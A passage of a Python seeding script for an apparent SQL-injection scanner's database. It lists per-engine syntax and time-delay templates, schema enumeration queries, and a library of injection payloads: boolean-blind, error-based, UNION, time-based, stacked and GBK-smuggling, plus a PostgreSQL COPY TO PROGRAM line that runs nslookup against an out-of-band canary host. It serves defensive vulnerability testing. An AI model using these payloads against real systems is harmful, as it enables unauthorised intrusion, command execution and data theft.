        ("VER_MSSQL_2022", "ENG_MSSQL", "SQL Server 2022", 2022, "IS [NOT] DISTINCT FROM, DATETRUNC, WINDOW clause", "WAITFOR DELAY", "--", "1/0"),
        ("VER_ORACLE_12C", "ENG_ORACLE", "Oracle 12c", 2013, "FETCH FIRST n ROWS ONLY, invisible columns, identity columns", "DBMS_PIPE.RECEIVE_MESSAGE", "--", "TO_CHAR(1/0)"),
        ("VER_ORACLE_19C", "ENG_ORACLE", "Oracle 19c", 2019, "Long-Term Support release, JSON functions, LISTAGG distinct", "DBMS_PIPE.RECEIVE_MESSAGE", "--", "TO_CHAR(1/0)"),
        ("VER_ORACLE_23C", "ENG_ORACLE", "Oracle 23c/23ai", 2023, "JSON Relational Duality, AI Vector Search (VECTOR type, VECTOR_DISTANCE)", "DBMS_PIPE.RECEIVE_MESSAGE", "--", "TO_CHAR(1/0)"),
        ("VER_SQLITE_325", "ENG_SQLITE", "SQLite 3.25.0", 2018, "Window functions support added", "CPU randomblob()", "--", "1/0"),
        ("VER_SQLITE_335", "ENG_SQLITE", "SQLite 3.35.0", 2021, "RETURNING clause added, math functions built-in", "CPU randomblob()", "--", "1/0"),
        ("VER_SQLITE_338", "ENG_SQLITE", "SQLite 3.38.0", 2022, "JSON operator -> and ->> added to core grammar", "CPU randomblob()", "--", "1/0"),
        ("VER_CLICKHOUSE_24", "ENG_CLICKHOUSE", "ClickHouse 24.x", 2024, "throwIf() error trigger, sleep(), arrayStringConcat", "sleep(s)", "--", "throwIf(1)"),
        ("VER_SNOWFLAKE_CLOUD", "ENG_SNOWFLAKE", "Snowflake Cloud", 2024, "SYSTEM$WAIT(s), IFF(), semi-structured FLATTEN", "SYSTEM$WAIT(s)", "--", "1/0"),
    ]
    cur.executemany("INSERT INTO dbms_versions VALUES (?, ?, ?, ?, ?, ?, ?, ?)", versions)

    # 16. DBMS Capabilities (Declarative syntax templates across all 30 engines)
    capabilities_data = [
        ("CAP_POSTGRES", "ENG_POSTGRES", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS text)", "1/(SELECT 0)", "1", "pg_sleep({seconds})", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM information_schema.tables WHERE table_schema='public'", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_MYSQL", "ENG_MYSQL", "#", "/*", "*/", " ", "CONCAT(parts.join(','))", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {offset},{limit}", "LIMIT 1", "CAST(({expr}) AS SIGNED)", "CAST(({expr}) AS CHAR)", "EXP(710)", "1", "sleep({seconds})", "SELECT @@version", "SELECT current_user()", "SELECT database()", "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_MARIADB", "ENG_MARIADB", "#", "/*", "*/", " ", "CONCAT(parts.join(','))", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {offset},{limit}", "LIMIT 1", "CAST(({expr}) AS SIGNED)", "CAST(({expr}) AS CHAR)", "EXP(710)", "1", "sleep({seconds})", "SELECT @@version", "SELECT current_user()", "SELECT database()", "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_MSSQL", "ENG_MSSQL", "--", "/*", "*/", "+", "parts.join('+')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LEN({expr})", "OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY", "TOP 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS nvarchar(max))", "1/0", "1", "WAITFOR DELAY '0:0:{seconds}'", "SELECT @@version", "SELECT SYSTEM_USER", "SELECT DB_NAME()", "SELECT name FROM sys.tables", "SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table}')", "SELECT {columns} FROM {table}", 0),
        ("CAP_ORACLE", "ENG_ORACLE", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY", "FETCH FIRST 1 ROWS ONLY", "TO_NUMBER({expr})", "TO_CHAR({expr})", "TO_CHAR(1/0)", "1", "DBMS_PIPE.RECEIVE_MESSAGE('a',{seconds})", "SELECT banner FROM v$version WHERE ROWNUM=1", "SELECT user FROM dual", "SELECT ora_database_name FROM dual", "SELECT table_name FROM all_tables WHERE owner=USER", "SELECT column_name FROM all_tab_columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_SQLITE", "ENG_SQLITE", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTR({expr},{pos},{len})", "UNICODE({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS integer)", "CAST(({expr}) AS text)", "1/0", "1", "like('a',lower(hex(randomblob({seconds}00000000/2))))", "SELECT sqlite_version()", "SELECT 'sqlite_user'", "SELECT 'main'", "SELECT name FROM sqlite_master WHERE type='table'", "SELECT name FROM pragma_table_info('{table}')", "SELECT {columns} FROM {table}", 0),
        ("CAP_DB2", "ENG_DB2", "--", "/*", "*/", "CONCAT", "CONCAT(parts)", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "FETCH FIRST {limit} ROWS ONLY", "FETCH FIRST 1 ROWS ONLY", "INTEGER({expr})", "VARCHAR({expr})", "1/(SELECT 0 FROM sysibm.sysdummy1)", "1", "repeat('a', {seconds}0000000)", "SELECT service_level FROM sysibmadm.env_sys_info", "SELECT current user FROM sysibm.sysdummy1", "SELECT current server FROM sysibm.sysdummy1", "SELECT tabname FROM syscat.tables WHERE tabschema=CURRENT USER", "SELECT colname FROM syscat.columns WHERE tabname='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_H2", "ENG_H2", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS INT)", "CAST(({expr}) AS VARCHAR)", "1/0", "1", "CALL Thread.sleep({seconds}000)", "SELECT H2VERSION()", "SELECT USER()", "SELECT DATABASE()", "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC'", "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_ACCESS", "ENG_ACCESS", "--", "/*", "*/", "&", "parts.join('&')", "MID({expr},{pos},{len})", "ASC({expr})", "CHR({code})", "LEN({expr})", "TOP {limit}", "TOP 1", "CINT({expr})", "CSTR({expr})", "1/0", "1", "Cartesian join computational delay", "SELECT 'MS Access'", "SELECT 'CurrentUser'", "SELECT 'CurrentDB'", "SELECT Name FROM MSysObjects WHERE Type=1 AND Flags=0", "SELECT Name FROM MSysObjects WHERE ParentId=(SELECT Id FROM MSysObjects WHERE Name='{table}')", "SELECT {columns} FROM {table}", 0),
        ("CAP_SNOWFLAKE", "ENG_SNOWFLAKE", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "TO_NUMBER({expr})", "TO_VARCHAR({expr})", "1/0", "1", "SYSTEM$WAIT({seconds})", "SELECT CURRENT_VERSION()", "SELECT CURRENT_USER()", "SELECT CURRENT_DATABASE()", "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=CURRENT_SCHEMA()", "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_BIGQUERY", "ENG_BIGQUERY", "--", "/*", "*/", "CONCAT", "CONCAT(parts)", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST({expr} AS INT64)", "CAST({expr} AS STRING)", "1/0", "1", "Cartesian unnest generate_array delay", "SELECT @@version", "SELECT SESSION_USER()", "SELECT CURRENT_DATABASE()", "SELECT table_name FROM INFORMATION_SCHEMA.TABLES", "SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_CLICKHOUSE", "ENG_CLICKHOUSE", "--", "/*", "*/", "CONCAT", "CONCAT(parts)", "substring({expr},{pos},{len})", "ascii({expr})", "char({code})", "length({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "toInt64({expr})", "toString({expr})", "throwIf(1)", "1", "sleep({seconds})", "SELECT version()", "SELECT currentUser()", "SELECT currentDatabase()", "SELECT name FROM system.tables WHERE database=currentDatabase()", "SELECT name FROM system.columns WHERE table='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_COCKROACH", "ENG_COCKROACH", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS text)", "1/(SELECT 0)", "1", "pg_sleep({seconds})", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM information_schema.tables WHERE table_schema='public'", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_REDSHIFT", "ENG_REDSHIFT", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS text)", "1/(SELECT 0)", "1", "pg_sleep({seconds})", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM information_schema.tables WHERE table_schema='public'", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_DUCKDB", "ENG_DUCKDB", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS integer)", "CAST(({expr}) AS text)", "1/0", "1", "range({seconds}0000000)", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM information_schema.tables", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_TRINO", "ENG_TRINO", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS integer)", "CAST(({expr}) AS varchar)", "fail('error')", "1", "sequence(1, {seconds}0000000)", "SELECT version()", "SELECT current_user", "SELECT current_schema", "SELECT table_name FROM information_schema.tables", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_PRESTO", "ENG_PRESTO", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS integer)", "CAST(({expr}) AS varchar)", "fail('error')", "1", "sequence(1, {seconds}0000000)", "SELECT version()", "SELECT current_user", "SELECT current_schema", "SELECT table_name FROM information_schema.tables", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_VERTICA", "ENG_VERTICA", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS varchar)", "1/0", "1", "SLEEP({seconds})", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM v_catalog.tables", "SELECT column_name FROM v_catalog.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_HANA", "ENG_HANA", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "TO_INT({expr})", "TO_VARCHAR({expr})", "1/0", "1", "SLEEP_SECONDS({seconds})", "SELECT version FROM sys.m_database", "SELECT CURRENT_USER FROM DUMMY", "SELECT CURRENT_SCHEMA FROM DUMMY", "SELECT TABLE_NAME FROM SYS.TABLES WHERE SCHEMA_NAME=CURRENT_SCHEMA", "SELECT COLUMN_NAME FROM SYS.COLUMNS WHERE TABLE_NAME='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_TERADATA", "ENG_TERADATA", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "CHARACTERS({expr})", "TOP {limit}", "TOP 1", "CAST(({expr}) AS INTEGER)", "CAST(({expr}) AS VARCHAR(1000))", "1/0", "1", "Cartesian join computational delay", "SELECT InfoData FROM DBC.DBCInfo WHERE InfoKey='VERSION'", "SELECT USER", "SELECT DATABASE", "SELECT TableName FROM DBC.TablesV WHERE DataBaseName=USER", "SELECT ColumnName FROM DBC.ColumnsV WHERE TableName='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_FIREBIRD", "ENG_FIREBIRD", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr} FROM {pos} FOR {len})", "ASCII_VAL({expr})", "ASCII_CHAR({code})", "CHAR_LENGTH({expr})", "FIRST {limit} SKIP {offset}", "FIRST 1", "CAST(({expr}) AS INTEGER)", "CAST(({expr}) AS VARCHAR(255))", "1/0", "1", "Cartesian join computational delay", "SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database", "SELECT CURRENT_USER FROM RDB$DATABASE", "SELECT CURRENT_ROLE FROM RDB$DATABASE", "SELECT rdb$relation_name FROM rdb$relations WHERE rdb$view_blr IS NULL", "SELECT rdb$field_name FROM rdb$relation_fields WHERE rdb$relation_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_DATABRICKS", "ENG_DATABRICKS", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTR({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS INT)", "CAST(({expr}) AS STRING)", "ASSERT_TRUE(1=0)", "1", "RANGE({seconds}0000000)", "SELECT current_version()", "SELECT current_user()", "SELECT current_database()", "SELECT table_name FROM information_schema.tables", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_SYNAPSE", "ENG_SYNAPSE", "--", "/*", "*/", "+", "parts.join('+')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LEN({expr})", "OFFSET {offset} ROWS FETCH NEXT {limit} ROWS ONLY", "TOP 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS nvarchar(max))", "1/0", "1", "WAITFOR DELAY '0:0:{seconds}'", "SELECT @@version", "SELECT SYSTEM_USER", "SELECT DB_NAME()", "SELECT name FROM sys.tables", "SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table}')", "SELECT {columns} FROM {table}", 0),
        ("CAP_DORIS", "ENG_DORIS", "#", "/*", "*/", " ", "CONCAT(parts.join(','))", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {offset},{limit}", "LIMIT 1", "CAST(({expr}) AS SIGNED)", "CAST(({expr}) AS CHAR)", "EXP(710)", "1", "sleep({seconds})", "SELECT @@version", "SELECT current_user()", "SELECT database()", "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_SINGLESTORE", "ENG_SINGLESTORE", "#", "/*", "*/", " ", "CONCAT(parts.join(','))", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {offset},{limit}", "LIMIT 1", "CAST(({expr}) AS SIGNED)", "CAST(({expr}) AS CHAR)", "EXP(710)", "1", "sleep({seconds})", "SELECT @@version", "SELECT current_user()", "SELECT database()", "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_VITESS", "ENG_VITESS", "#", "/*", "*/", " ", "CONCAT(parts.join(','))", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {offset},{limit}", "LIMIT 1", "CAST(({expr}) AS SIGNED)", "CAST(({expr}) AS CHAR)", "EXP(710)", "1", "sleep({seconds})", "SELECT @@version", "SELECT current_user()", "SELECT database()", "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_TIMESCALE", "ENG_TIMESCALE", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS text)", "1/(SELECT 0)", "1", "pg_sleep({seconds})", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM information_schema.tables WHERE table_schema='public'", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_YUGABYTE", "ENG_YUGABYTE", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS text)", "1/(SELECT 0)", "1", "pg_sleep({seconds})", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM information_schema.tables WHERE table_schema='public'", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_ALLOYDB", "ENG_ALLOYDB", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS int)", "CAST(({expr}) AS text)", "1/(SELECT 0)", "1", "pg_sleep({seconds})", "SELECT version()", "SELECT current_user", "SELECT current_database()", "SELECT table_name FROM information_schema.tables WHERE table_schema='public'", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
        ("CAP_GENERIC", "ENG_GENERIC", "--", "/*", "*/", "||", "parts.join('||')", "SUBSTRING({expr},{pos},{len})", "ASCII({expr})", "CHAR({code})", "LENGTH({expr})", "LIMIT {limit} OFFSET {offset}", "LIMIT 1", "CAST(({expr}) AS INTEGER)", "CAST(({expr}) AS VARCHAR)", "1/0", "1", "Cartesian join computational delay", "SELECT @@version", "SELECT USER", "SELECT CURRENT_SCHEMA", "SELECT table_name FROM information_schema.tables", "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'", "SELECT {columns} FROM {table}", 0),
    ]
    cur.executemany("INSERT INTO dbms_capabilities VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", capabilities_data)

    # 17. Payload Templates (Canonical parameterized non-destructive templates)
    payload_templates = [
        # Boolean Blind Templates (M01)
        ("TPL_M01_NUM", "M01", "CTX_NUMERIC", "ENG_GENERIC", "integer", "UNQUOTED", "AND 1=1", "AND 1=2", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "Halfond (2006)"),
        ("TPL_M01_SQ", "M01", "CTX_SINGLE_QUOTE", "ENG_GENERIC", "string", "SINGLE_QUOTE", "' AND '1'='1", "' AND '1'='2", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "Halfond (2006)"),
        ("TPL_M01_DQ", "M01", "CTX_DOUBLE_QUOTE", "ENG_GENERIC", "string", "DOUBLE_QUOTE", "\" AND \"1\"=\"1", "\" AND \"1\"=\"2", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "Halfond (2006)"),
        ("TPL_M01_PAR", "M01", "CTX_PAREN_STRING", "ENG_GENERIC", "string", "PARENTHESIZED", "') AND ('1'='1", "') AND ('1'='2", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "Halfond (2006)"),
        ("TPL_M01_LIKE", "M01", "CTX_LIKE", "ENG_GENERIC", "string", "SINGLE_QUOTE", "%' AND '1%'='1", "%' AND '1%'='2", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "OWASP WSTG-INPV-05"),
        ("TPL_M01_ORDER", "M01", "CTX_ORDER_BY", "ENG_GENERIC", "identifier", "UNQUOTED", ", (CASE WHEN 1=1 THEN 1 ELSE 2 END)", ", (CASE WHEN 1=2 THEN 1 ELSE 2 END)", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "PortSwigger SQLi ORDER BY"),
        ("TPL_M01_LIMIT", "M01", "CTX_LIMIT_OFFSET", "ENG_GENERIC", "integer", "UNQUOTED", "OFFSET (CASE WHEN 1=1 THEN 0 ELSE 999999 END)", "OFFSET (CASE WHEN 1=2 THEN 0 ELSE 999999 END)", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "SQL:1999 Limit Clause"),
        
        # Error-Based Templates (M02)
        ("TPL_M02_PG", "M02", "CTX_SINGLE_QUOTE", "ENG_POSTGRES", "string", "SINGLE_QUOTE", "' AND 1=CAST((SELECT version()) AS int)--", "' AND 1=1--", "ORC_ERROR", "SAFE_NON_DESTRUCTIVE", "PortSwigger Lab 03"),
        ("TPL_M02_MY", "M02", "CTX_SINGLE_QUOTE", "ENG_MYSQL", "string", "SINGLE_QUOTE", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", "' AND 1=1-- -", "ORC_ERROR", "SAFE_NON_DESTRUCTIVE", "MySQL Count-Group Error"),
        ("TPL_M02_MS", "M02", "CTX_SINGLE_QUOTE", "ENG_MSSQL", "string", "SINGLE_QUOTE", "' AND 1=CONVERT(int,@@version)--", "' AND 1=1--", "ORC_ERROR", "SAFE_NON_DESTRUCTIVE", "MSSQL Conversion Error"),
        ("TPL_M02_ORA", "M02", "CTX_SINGLE_QUOTE", "ENG_ORACLE", "string", "SINGLE_QUOTE", "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", "' AND 1=1--", "ORC_ERROR", "SAFE_NON_DESTRUCTIVE", "Oracle CTXSYS Error"),
        
        # UNION-Based Canary Templates (M03)
        ("TPL_M03_CANARY", "M03", "CTX_SINGLE_QUOTE", "ENG_GENERIC", "string", "SINGLE_QUOTE", "' UNION SELECT 'CANARY_V7_MARKER'--", "' AND 1=2--", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "PortSwigger Lab 04"),
        ("TPL_M03_COLS", "M03", "CTX_NUMERIC", "ENG_GENERIC", "integer", "UNQUOTED", "UNION SELECT NULL, NULL, NULL--", "AND 1=2--", "ORC_STATUS", "SAFE_NON_DESTRUCTIVE", "PortSwigger Lab 01"),
        
        # Time-Based SPRT Delay Templates (M04)
        ("TPL_M04_PG", "M04", "CTX_SINGLE_QUOTE", "ENG_POSTGRES", "string", "SINGLE_QUOTE", "' || pg_sleep(5)--", "' || pg_sleep(0)--", "ORC_SPRT_TIMING", "TIMING_SENSITIVE", "Wald (1945) SPRT"),
        ("TPL_M04_MY", "M04", "CTX_SINGLE_QUOTE", "ENG_MYSQL", "string", "SINGLE_QUOTE", "' AND sleep(5)-- -", "' AND sleep(0)-- -", "ORC_SPRT_TIMING", "TIMING_SENSITIVE", "Wald (1945) SPRT"),
        ("TPL_M04_MS", "M04", "CTX_SINGLE_QUOTE", "ENG_MSSQL", "string", "SINGLE_QUOTE", "'; WAITFOR DELAY '0:0:5'--", "' AND 1=1--", "ORC_SPRT_TIMING", "TIMING_SENSITIVE", "Wald (1945) SPRT"),
        ("TPL_M04_ORA", "M04", "CTX_SINGLE_QUOTE", "ENG_ORACLE", "string", "SINGLE_QUOTE", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", "' AND 1=1--", "ORC_SPRT_TIMING", "TIMING_SENSITIVE", "Wald (1945) SPRT"),
        ("TPL_M04_SQLITE", "M04", "CTX_SINGLE_QUOTE", "ENG_SQLITE", "string", "SINGLE_QUOTE", "' AND like('a',lower(hex(randomblob(500000000/2))))--", "' AND 1=1--", "ORC_SPRT_TIMING", "TIMING_SENSITIVE", "SQLite CPU Delay"),
        
        # Stacked Execution Templates (M05)
        ("TPL_M05_STACKED", "M05", "CTX_SINGLE_QUOTE", "ENG_MSSQL", "string", "SINGLE_QUOTE", "'; SELECT 1;--", "';--", "ORC_STATUS", "STATE_MUTATING", "T-SQL Multi-Batch"),
        
        # Out-of-Band OAST Templates (M08)
        ("TPL_M08_DNS", "M08", "CTX_SINGLE_QUOTE", "ENG_POSTGRES", "string", "SINGLE_QUOTE", "'; COPY (SELECT '') TO PROGRAM 'nslookup canary.oast.sentinel.dev'--", "';--", "ORC_OAST", "SAFE_NON_DESTRUCTIVE", "PortSwigger Lab 11"),
        
        # Relational Metamorphic TLP Templates (M09)
        ("TPL_M09_TLP", "M09", "CTX_WHERE", "ENG_GENERIC", "string", "UNQUOTED", "WHERE (p) UNION ALL WHERE NOT (p) UNION ALL WHERE (p IS NULL)", "WHERE TRUE", "ORC_TLP_METAMORPHIC", "SAFE_NON_DESTRUCTIVE", "Rigger & Su (USENIX 2020)"),
        
        # Modern JSON / XML Operators (M10)
        ("TPL_M10_JSON", "M10", "CTX_JSON_PATH", "ENG_POSTGRES", "json", "CONTEXT_DEPENDENT", "->>'key' = 'val' AND 1=1", "->>'key' = 'val' AND 1=2", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "PostgreSQL JSON Operator Spec"),
        
        # Multibyte GBK Smuggling (M12)
        ("TPL_M12_GBK", "M12", "CTX_SINGLE_QUOTE", "ENG_MYSQL", "encoded", "SINGLE_QUOTE", "%bf%27 OR 1=1#", "%bf%27 OR 1=2#", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "Chris Shiflett GBK"),
        
        # Vector Similarity Fuzzing (M16)
        ("TPL_M16_VEC", "M16", "CTX_VECTOR_OP", "ENG_POSTGRES", "vector", "CONTEXT_DEPENDENT", "<-> '[0,0,0]' >= 0", "<-> '[0,0,0]' < 0", "ORC_CONTENT", "SAFE_NON_DESTRUCTIVE", "pgvector Distance Metric Invariants"),
    ]
    cur.executemany("INSERT INTO payload_templates VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", payload_templates)

    # 18. Evidence Ledger (Model for Every Claim & Test Proof)
    evidence_entries = [
        ("EV_M01", "M01", "MECHANISM", "REF_HALFOND_2006", "src/services/sqlScanner/BooleanTester.ts", "src/services/sqlScanner/PortSwiggerLabArchetypes.test.ts", "Lab 01: Blind SQL injection with conditional responses", 0, now, "VERIFIED_MOCK"),
        ("EV_M02", "M02", "MECHANISM", "REF_PORTSWIGGER_SQLI", "src/services/sqlScanner/ErrorTester.ts", "src/services/sqlScanner/PortSwiggerLabArchetypes.test.ts", "Lab 03: Blind SQL injection with conditional errors", 0, now, "VERIFIED_MOCK"),
        ("EV_M03", "M03", "MECHANISM", "REF_PORTSWIGGER_SQLI", "src/services/sqlScanner/UnionTester.ts", "src/services/sqlScanner/PortSwiggerLabArchetypes.test.ts", "Lab 04: SQL injection UNION attack determining column count", 0, now, "VERIFIED_MOCK"),
        ("EV_M04", "M04", "MECHANISM", "REF_WALD_1945", "src/services/sqlScanner/engine/SprtTimingEngine.ts", "src/services/sqlScanner/ComprehensiveSqlArchetypeBenchmark.test.ts", "Wald SPRT Latency Discrimination", 0, now, "VERIFIED_MOCK"),
        ("EV_M05", "M05", "MECHANISM", None, "src/services/sqlScanner/StackedTester.ts", "src/services/sqlScanner/SqlScannerRegression.test.ts", "Stacked query multi-statement execution", 0, now, "VERIFIED_MOCK"),
        ("EV_M06", "M06", "MECHANISM", "REF_PORTSWIGGER_SQLI", "src/services/sqlScanner/BooleanTester.ts", "src/services/sqlScanner/ScannerGapFixes.test.ts", "Dynamic ORDER BY differential validation", 0, now, "VERIFIED_MOCK"),
